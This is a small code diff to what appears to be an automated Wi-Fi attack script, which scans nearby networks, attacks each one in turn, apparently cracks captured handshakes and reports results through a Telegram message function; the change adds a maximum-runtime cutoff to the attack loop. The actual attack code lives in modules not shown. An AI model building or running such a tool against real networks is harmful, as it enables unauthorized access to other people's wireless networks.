@@ -1,4 +1,5 @@
 import os
+import time
 import logging
 import subprocess
 from utils import clean_files, setup_logging, is_ssh_connected
@@ -7,12 +8,15 @@ from constants import (
     CRACKED_FILE,
     ATTACK_INTERFACE,
     PCAP_FILE,
-    STOP_ON_SUCCESS
+    STOP_ON_SUCCESS,
+    MAX_RUNTIME
 )
 from wifi_scan import scan_targets
 from wifi_attack import attack_target
 from wifi_connect import connect_to_wifi
 from send_to_telegram import send_message
+
+global_start_time = time.time()
 
 def has_internet():
     try:
@@ -40,6 +44,10 @@ targets = scan_targets(ATTACK_INTERFACE)
 
 # Attack loop
 while targets:
+    if time.time() - global_start_time > MAX_RUNTIME:
+        logging.warning("Max runtime exceeded. Exiting.")
+        break
+
     essid, power = targets.pop(0)
     logging.info(f"Attacking {essid} (power: {power} dB)")
     result = attack_target(ATTACK_INTERFACE, essid)
